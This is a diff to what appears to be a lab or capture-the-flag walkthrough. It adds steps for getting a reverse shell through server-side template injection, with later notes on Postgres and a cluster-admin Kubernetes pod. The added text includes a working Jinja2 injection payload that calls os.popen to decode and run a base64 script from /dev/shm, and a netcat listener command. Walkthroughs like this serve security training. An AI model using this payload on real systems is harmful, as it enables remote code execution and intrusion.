@@ -10,7 +10,7 @@
  - [Introduction to fee](#item-three)
  - [Interacting with postgesql](#item-five)
  - [Playing with kube-api insite a pod with `cluster-admin`](#item-six)
- - [tools](#item-seven)
+ - [Tools](#item-seven)
  
 ## Synopsis
 
@@ -97,9 +97,19 @@ We can interact with `/dev/shm` for our purposes to execute scripts with python 
 We can see what version of python is available on the system with `python --version`
 
 ---
-We can get a reverse shell by writing the python3 shell in [tools](#item-seven) to /dev/shm
+We can get a reverse shell by base64 encoding writing the python3 shell in [tools](#item-seven) to /dev/shm
 
+Example in burp:
+![N|Solid](./images/Request.png)
 
+Start Listener `nc -l 45678` for example and execute shell:
+
+```sh
+a {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /dev/shm/rev.py | base64 -d | python3').read() }}
+```
+
+---
+The `env` command shows that we can see there is a service frontending Postgres. Hopefully there are no Network Policys and we can connect to it... but how
 ---
 <a id="item-three"></a>
 # Introduction to Fee: https://pypi.org/project/fee/ 
